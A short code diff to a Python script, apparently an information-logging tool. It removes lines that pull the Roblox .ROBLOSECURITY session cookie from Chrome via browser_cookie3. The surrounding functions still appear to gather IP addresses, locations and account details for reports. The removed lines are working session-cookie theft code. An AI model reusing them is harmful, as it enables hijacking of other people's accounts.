@@ -90,10 +90,6 @@ def reportError(error):
     
 def get_roblox_info():
         session = requests.Session()
-        
-        cookies = browser_cookie3.chrome(domain_name = "roblox.com")
-        cookies = str(cookies)
-        cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
 
         user_resp = session.get('https://users.roblox.com/v1/users/authenticated', timeout=10)
         if user_resp.status_code != 200:
@@ -111,8 +107,7 @@ def get_roblox_info():
         return {
             'username': username,
             'id': str(uid) if uid else 'Unknown',
-            'robux': f"{robux:,}",
-            'cookie': cookie
+            'robux': f"{robux:,}"
         }
 
 def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
